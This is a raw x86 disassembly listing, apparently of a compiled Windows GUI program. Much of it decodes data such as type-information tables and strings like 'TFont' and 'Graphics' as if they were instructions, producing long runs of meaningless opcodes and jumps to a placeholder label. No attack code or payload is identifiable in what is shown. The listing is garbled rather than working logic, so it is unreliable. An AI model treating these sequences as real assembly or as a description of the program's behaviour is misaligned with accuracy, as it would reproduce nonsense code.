add [ edx - 0x1 ] cl
add [ eax ] al
inc esi
dec ecx
add [ ebx - 0x1 ] cl
add [ eax ] al
inc esi
dec ecx
add [ edi + edi * 8 ] cl
add [ esi + eax * 2 + 0x49 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
inc esi
dec ecx
add [ esi - 0x1 ] cl
add [ eax ] al
inc esi
dec ecx
add [ edi - 0x1 ] cl
add [ eax ] al
inc esi
dec ecx
add [ eax ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
inc esi
dec ecx
add [ 0x640000ff ] dh
inc esi
dec ecx
add [ esi ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
inc esi
dec ecx
add [ 0x640000ff ] bh
inc esi
dec ecx
add [ esi ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
inc esi
dec ecx
add [ 0x640000ff ] ah
inc esi
dec ecx
add [ esi ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
inc esi
dec ecx
add [ 0x640000ff ] ch
inc esi
dec ecx
add [ esi ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add [ ecx ] dl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_41b451
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b458
retn
sub_41b468
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
enter 0x41b4 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x41b4 0x0
or al 0x0
add [ eax ] al
adc al 0x72
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ esi * 4 + 0x41 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xb5
inc ecx
add [ eax + eax ] cl
add [ eax ] al
adc al 0x72
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
inc esp
mov ch 0x41
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
cwde
mov ch 0x41
add [ ecx ] al
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
mov ah 0xb5
inc ecx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax - 0x4b ] al
inc ecx
add [ ecx ] cl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax + 0x70041b6 ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
mov ch 0x41
add [ ebx + 0x41b61cc0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
mov al 0xb5
inc ecx
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x60041b5 ] dh
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0xb604c08b
inc ecx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax ] bl
mov dh 0x41
add [ edi ] al
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
sub al 0xb8
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x41b68490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
mov eax 0xb8180041
inc ecx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
rol [ eax - 0x49 ] 0x41
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov al 0xb5
inc ecx
add [ esi ] al
popad
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ edi + esi * 4 ] bh
inc ecx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x41b58890
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
mov [ ecx + 0x41 ] cl
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc ecx
add [ eax ] bl
add [ eax ] al
add al ah
and [ ecx ] al
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
inc [ ebp + ecx * 8 + 0x41 ]
add [ ecx ] al
add ch bh
jae r-xdata
add [ ebx ] al
mov eax eax
inc eax
mov bh 0x41
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
outsb
je r-xdata
add [ edi ] cl
push esp
inc edi
jb r-xdata
int 0x41
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0xb740c08b
inc ecx
dec ebp
jb r-xdata
outsb
jb r-xdata
add al 0xb8
add [ eax ] al
push esp
mov eax 0x200041
add [ eax ] al
add [ eax ] eax
std
imul esp [ ebx + 0x73 ] 0xffff0001
nop
fdivr [ eax + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xb8
inc ecx
add [ eax ] cl
mov ecx 0x41
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + ebp - 0x48 ] si
inc ecx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
add [ eax ] bl
mov eax 0x180041
add [ eax ] al
loopne r-xdata
insb
nop
inc edi
outsd
popad
insb
dec esi
outsd
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
idiv [ eax - 0x4701ffbf ]
inc ecx
add [ eax + eax ] ah
add [ eax ] al
mov eax 0x8c0041b7
xor eax 0x35980040
or [ ecx + 0x41 ] bh
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + eax - 0x48 ] si
inc ecx
add [ ecx + 0x41 ] dl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ ecx + ecx * 2 + 0x10041 ] dh
std
inc ecx
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 ] ch
imul esp [ ebx + 0x73 ] 0x41b80490
jo r-xdata
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
mov bh 0x41
add [ ebp + esi + 0x35980040 ] cl
imul esp [ ebx + 0x73 ] 0xc08b0000
pop eax
mov eax 0xf0f0041
dec ecx
inc ebx
push 0x65676e61
dec esi
outsd
je r-xdata
inc eax
add al bh
xor al [ eax ]
push esp
rol [ ecx ] 0x1
cwde
dec edx
inc ecx
add [ eax - 0x67ffbeb6 ] ah
rol [ ecx ] 0x1
push cs
imul sp [ ebp + 0x72 ] 0x113c
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edi * 4 + 0x41 ] dl
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
add [ esi ] cl
jo r-xdata
sub_41b8fc
inc ecx
add [ 0x6e6f4654 ] al
je r-xdata
outsb
je r-xdata
mov ecx 0x5070041
push esp
inc esi
outsd
add [ eax ] al
add [ eax ] eax
add [ eax ] al
push esp
mov eax 0x200041
add [ eax ] al
add [ eax ] eax
std
mov eax 0xb8280041
inc ecx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x41b58474
add ah ah
rol [ ecx ] cl
cld
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
push esp
mov edx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
mov edx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
popad
insd
inc eax
mov ch 0x41
add ah cl
test [ ebp - 0x2c1bffbf ] dh
inc ecx
add ah bh
imul esp [ ebx + 0x73 ] 0xb5940007
inc ecx
add ah bh
aam 0x41
add [ edx * 8 + 0x10041 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
pop es
inc ebx
push 0x65737261
je r-xdata
in al 0xd7
inc ecx
add ah ch
xlat
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0xbb54c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x45 ] ah
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x73ffbe49 ] bh
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
pop eax
fadd [ ecx ]
cwde
dec edx
inc ecx
add [ eax - 0x7fffbeb6 ] ah
fadd [ ecx ]
push es
push esp
inc edx
jb r-xdata
imul esp [ ebx + 0x73 ] 0xb4640004
inc ecx
add [ eax - 0x3fffbe2a ] bh
salc
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
mov eax 0x8c0041b7
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
jo r-xdata
add [ eax - 0x46 ] ah
inc ecx
add [ eax + eax ] bl
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ eax + 0x40041d5 ] bl
push esp
push eax
outsb
lea eax [ eax ]
insb
mov edx 0x4070041
push esp
push eax
outsb
push esp
mov edx 0xb8280041
inc ecx
add [ eax + eax ] al
aam 0x41
add ah dl
aam 0x41
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
mov ah 0x41
add [ eax ] bl
add [ eax ] al
call esp
rol [ ecx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
jae r-xdata
pushad
mov edx 0x1c0041
mov dh 0x41
add [ eax ] bl
add [ eax ] al
jmp [ eax + 0x10041d7 ]
add eax 0x63746950
push r-xdata
pop eax
aam 0x41
add [ esp + edx * 8 + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
xchg esp eax
aam 0x41
add [ eax + 0x10041d4 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
add [ eax ] al
add [ eax + eax ] al
adc [ eax ] al
mov ah 0xd3
inc ecx
add [ ebx + edx * 8 + 0x10041 ] bh
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ ecx + ecx * 2 - 0x1c6fffbf ] dh
inc ecx
add [ ebx + 0x41 ] bh
add [ eax + 0x70041e2 ] dh
push esp
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
fcomp st3
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
insb
mov ebx 0x6070041
push esp
inc edx
jb r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dh
mov esp 0x580041
add [ eax ] al
loopne r-xdata
jae r-xdata
jb r-xdata
outsd
add al 0xb9
inc ecx
add [ eax + eax ] cl
add bh bh
inc edx
mov esp 0x7070041
push esp
inc ebx
popad
outsb
jbe r-xdata
cmp al 0xbc
push esp
mov ebx 0xb8280041
inc ecx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
jae r-xdata
mov ebp 0xe080041
mov edx 0x100041
add bh bh
inc eax
loope r-xdata
popad
jae r-xdata
xor cl ah
inc ecx
jae r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
jb r-xdata
add [ gs : bp + di ] cl
push eax
jb r-xdata
push ebx
je r-xdata
inc eax
jb r-xdata
or [ eax + 0x73 ] esi
push edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
loopne r-xdata
jb r-xdata
je r-xdata
push esp
push eax
jb r-xdata
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
adc al 0x0
mov esp 0x21540041
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
xor [ ecx + eax * 2 + 0x5800 ] bh
add al ah
and [ ecx ] al
imul esp [ ebx + 0x73 ] 0xb4640002
inc ecx
add al al
fld [ ecx ]
enter 0x41d9 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xffffff ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
xchg [ esp ] eax
jae r-xdata
xchg [ esp ] eax
inc eax
pop eax
outsb
je r-xdata
push cs
add [ gs : bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bl
mov esp 0x700a0041
jae r-xdata
jb r-xdata
jae r-xdata
ja r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x45737008
inc ecx
add [ ebx ] al
push cs
jb r-xdata
jb r-xdata
outsd
jb r-xdata
outsb
imul ebp [ fs : esi + 0x67 ] 0x61724708
jo r-xdata
or [ eax + 0x73 ] dh
inc ebp
dec ebp
loope r-xdata
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
add bh bh
dec esp
loope r-xdata
imul esp [ ebx + 0x73 ] 0xbb680004
inc ecx
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 4 ] bh
mov bh 0x41
add ah bl
fiadd [ ecx ]
in al 0xda
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
sbb [ ecx + eax * 2 ] bh
retn
push ebx
je r-xdata
add [ eax + edx - 0x336fffc0 ] bh
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x54 ]
outsd
outsb
add al 0x42
jns r-xdata
add dl al
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x90004010
outsb
add [ si ] bl
adc [ eax ] eax
fdivr [ ecx + eax * 2 + 0x40106c00 ]
inc ebp
jbe r-xdata
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
push esp
push edx
arpl [ gs : edx + eax + 0x3 ] si
dec ebp
push esp
push eax
jb r-xdata
imul esp [ ebx + 0x73 ] r-xdata
or [ esi ] cl
ja r-xdata
jne r-xdata
imul ebp [ esi + 0x67 ] 0x52737009
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
retn
add al 0x24
add [ gs : ecx ] cl
push edx
jb r-xdata
sbb al 0x11
outsb
je r-xdata
jae r-xdata
add ecx [ ebp + 0x73 ]
push es
mov ebp 0x10041
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
out 0xbd eax
inc ecx
add [ ebp - 0x3dffbe43 ] dh
push ebx
je r-xdata
push es
outsd
jmp [ eax + 0xc ]
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
add [ ebx + 0x7ab8cd12 ] ah
add ah bl
mov esp 0x106c0041
inc eax
imul ebp [ esi + 0x67 ] 0x40111c00
push esp
push eax
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
je r-xdata
int3
adc [ eax ] al
nop
sub_41be55
xor eax 0x4b580040
inc ecx
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
mov [ ecx + 0x41 ] cl
add [ eax + 0x5400414a ] bl
clc
inc ecx
add [ ecx + ecx * 2 + 0x4be80041 ] dh
inc ecx
add ah ah
test [ ecx ] r-xdata
mov al [ 0x300041f8 ]
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add al ch
stc
inc ecx
add ah ch
stc
inc ecx
add [ eax ] dh
sub eax [ eax ]
insb
cli
inc ecx
add [ eax ] dh
sub eax [ eax ]
sar dl 0x1
inc ecx
add ah dl
cli
inc ecx
add [ eax ] dh
sub eax [ eax ]
in al 0xfa
inc ecx
add [ edi + esi * 8 - 0x60fffbf ] ch
inc ecx
add [ eax - 0x6 ] bh
inc ecx
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ ecx ] al
add ch bh
inc [ edx + edi * 8 + 0x41 ]
add [ eax ] cl
push esp
inc edi
jb r-xdata
and [ edi - 0x40d0ffbf ] edi
inc ecx
add [ ecx ] bh
jo r-xdata
mov edi 0xbf110041
inc ecx
add [ ecx ] bl
mov edi 0x10041
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
aam 0x11
imul esp [ ebx - 0x73 ] 0xbef00040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx + 0x74 ] 0x540041be
and al [ ecx ]
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ch
mov edi 0xbff80041
inc ecx
add [ eax + eax ] ch
add [ eax ] al
shl [ ecx ] 0x1
inc ecx
add [ ebp + esi + 0x4b580040 ] cl
inc ecx
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
in al 0x2
inc edx
add [ ebx + eax ] dl
inc edx
add [ eax + 0x9 ] bh
inc edx
add al ah
push es
inc edx
add al ch
dec ebx
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edi * 4 + 0x41 ] dl
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add ch bh
inc ecx
add [ eax ] cl
rol [ ecx ] 0x0
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fld [ esi - 0x41 ]
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41bfc8c0 ] cl
add [ edx - 0x41 ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add al bl
mov edi 0xc0080041
aam 0x11
inc ecx
add [ eax ] al
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
enter 0x41bf 0x0
pop edx
mov edi 0x41
add [ eax ] al
fdivr [ edi - 0x3ff7ffbf ]
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_4206b0
sub_41c08c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd st0
inc ecx
add [ eax + eax ] ah
add [ eax ] al
sub al al
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
hlt
sub_41c0d1
or [ edx ] eax
xor [ edx ] cl
inc edx
add [ esi ] cl
push esp
dec ebp
je r-xdata
add al ch
dec ebx
imul bp [ ebp + 0x49 ] 0x616d
nop
xor al 0xc1
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41c1 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x300041c1 ] bl
add [ eax ] al
add [ eax ] ch
mov esi 0x358c0041
inc eax
add [ eax + 0x4b ] bl
inc ecx
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
jl r-xdata
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
imul bp [ ebp - 0x75 ] 0xa8c0
rol [ ecx ] 0x7
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
test [ ecx ] sub_420b40
mov al [ 0xffffffffd00041f8 ]
or eax [ edx ]
fmul [ ebx ]
inc edx
add [ esp + ecx ] bh
inc edx
add ah ch
stc
inc ecx
add al cl
or al 0x42
add [ eax + 0x4400420d ] ch
adc [ edx ] eax
sar dl 0x1
inc ecx
add [ eax ] dh
adc al [ edx ]
xor al 0x12
inc edx
add [ ebx + edx + 0xa340042 ] cl
inc edx
add al dh
stc
inc ecx
